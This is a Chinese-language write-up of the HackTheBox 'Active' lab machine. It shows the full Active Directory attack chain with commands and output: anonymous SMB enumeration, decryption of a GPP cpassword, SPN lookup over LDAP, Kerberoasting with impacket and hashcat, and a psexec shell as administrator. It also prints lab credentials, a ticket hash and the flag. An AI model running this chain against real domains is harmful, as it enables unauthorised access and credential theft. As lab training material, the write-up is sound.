## nmap 扫描结果
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Active Directory 101]
└─$ sudo nmap -Pn -sS -F --open --min-rate 1000 10.10.10.100
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 11:04 EDT
Nmap scan report for 10.10.10.100
Host is up (0.42s latency).
Not shown: 89 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
```


## SMB 匿名登录

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Active Directory 101/Active]
└─$ smbclient -L //10.10.10.100/                                                                                                                                                1 ⨯
Enter WORKGROUP\kali's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      

```

可以在`Replication`共享中找到密码

```bash
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

解密得到密码

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Active Directory 101]
└─$ gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
GPPstillStandingStrong2k18

```

得到该用户的账密之后，即可登录`smb`在该用户桌面得到`user.txt`

## 提权

根据得到的用户名提示，这里需要发起一个`TGS`请求，那么应该就是一个`kerberoasting`攻击了。

比如用户`administrator`设置了`SPN HTTP`，那么当普通用户向`kdc`发起访问`HTTP`服务的请求时候，`KDC`会使用`administrator`的密码的`HASH`来加密`TGS`并返回给我们，所以这里我们就能够获取到`administrator`用户的`hash`，然后离线进行破解。

首先使用`ldapsearch`来获取域内的`SPN`

```
┌──(kali㉿kali)-[~/Desktop/HTB/Active Directory 101/Active]
└─$ ldapsearch -x -D "SVC_TGS" -w "GPPstillStandingStrong2k18" -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=User)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname -H ldap://10.10.10.100
# extended LDIF
#
# LDAPv3
# base <dc=active,dc=htb> with scope subtree
# filter: (&(objectCategory=person)(objectClass=User)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))
# requesting: serviceprincipalname 
#

# Administrator, Users, active.htb
dn: CN=Administrator,CN=Users,DC=active,DC=htb
servicePrincipalName: active/CIFS:445

# search reference
ref: ldap://ForestDnsZones.active.htb/DC=ForestDnsZones,DC=active,DC=htb

# search reference
ref: ldap://DomainDnsZones.active.htb/DC=DomainDnsZones,DC=active,DC=htb

# search reference
ref: ldap://active.htb/CN=Configuration,DC=active,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

可以看到`administrator`设置了`SPN active/CIFS:445`，所以可以使用`Kerberoasting`来进行提权

发起`TGS`请求
```
┌──(kali㉿kali)-[~/Desktop/HTB/Active Directory 101/Active]
└─$ impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -outputfile hashes.kerberoast                                                                        130 ⨯
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2022-05-30 09:26:35.327772             



[-] CCache file is not found. Skipping...

```

使用`hashcat`破解密码
```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$24e8da993c6046a5a1d391f5a917da8d$5790fca1e65da51160cdb30c6a3b4c522b86d00877c1f28838d63e6c5421f4a3f7fc52daa2c4aa3e433c36612248e3e51fcb22ee7d2ebc50e71db896aeeb440f61c07b9c93b46b85921babd4127275307d0c5181c172f489bc7e4d7580f1737675893d576dc9b7417a71657d4c5d6f4851a0d3657a257d5bb47c56c98f4fc43756bbf5dd8e8c4df15ff8a4bc94f6d7e4cbe24706f318849c3740bf228e0bdca8299d5db571090c70495ba81cab392fdea09c685ae624548f2ab604bfc49f544b11321fe19a7ca5edb79a6cb3799b0264fa0dbbff278ed597be3265a5fe60773a837485a38e076e272a6a9f0a682c1edb5a5173207fabba7eb79de12008e3c884c9992e99f4925e26e4f04830b40c4b4120f3f2d2fa605ee4476dc2e9c09cf8f12322b492c334a718f20c1e8519a79584bf640bd7851ea22d399d2f45f95222c3104124380fc9dd8a971a6c007ccc04584d83fbf2b3bfd782babb45cd00961d33d6454fcf5bbdde8109c0f3a157c0a7f4d4ba87c6857f56bd04ad7d5d5a3e9722e49c6dd1067322e961e8ca6f4a8e589db429c0705fb7b6146dd2eb57fa729f37e1047024c1af3d3d2d79ed3f4e6437d35276e147fb23c6d749d7567e21bc73206e3e9169dd659bc2f94609629bae07c9985ed6d24ff58814d2ca77b566452a3b63caff5cb5be334da41860ef040e60ca4ebca86b1b3563eb9e34afe8385f20f6deb626b5ac1a7547623573262b2c630418ef7978feac4ccabcbfd439de070027095a0414a2a81be5e96987903b6047403e4600529258e202fa87f29ad6af900621f7b3cdffb2ee92dcc6baea5bdf3b188c7d8dde74edd2cb271aa9456e2a19389b64eb5c3c4b55b13af9c70770709765f70cf5949f3ba4da5a24ecb28d83c57c875002288c5893e3d434beb0df617a425314bc76ecd866f058dadd2eb3727a2558a2a1640057929c062c6afd70e78c7c5a5b87997d259a890bbac26f09d18987dc4e7745f0f515e52527967dcf075ae243645c813abc254ca98b62b2a41de310ccd86931c5385f30b0493a05bd29abea863191009a0891e35a010ac70aa258e02c97827805d22ddf503ada6c38fd524b9470a04e99d3bafc7c3ca11988b77b45e2bd942e14bac387a353541ab89f02b7d9ad6c22249b70e685070c82115276aa5a7cb708b7be9b3bb2530012ac66a423e9a66135451bb2af314c6ef18c0db316a81b80331636471d6c8698ebf3b7915b977e23cf17a4f5bf981d:Ticketmaster1968
```

获取`root.txt`

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Active Directory 101/Active]
└─$ impacket-psexec -dc-ip 10.10.10.100 active.htb/administrator:Ticketmaster1968@10.10.10.100                                                                                  1 ⨯
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file LBreSTxO.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service QupJ on 10.10.10.100.....
[*] Starting service QupJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> type C:\users\administrator\desktop\root.txt
397de210ecc36506b3fc05174b23b56e
```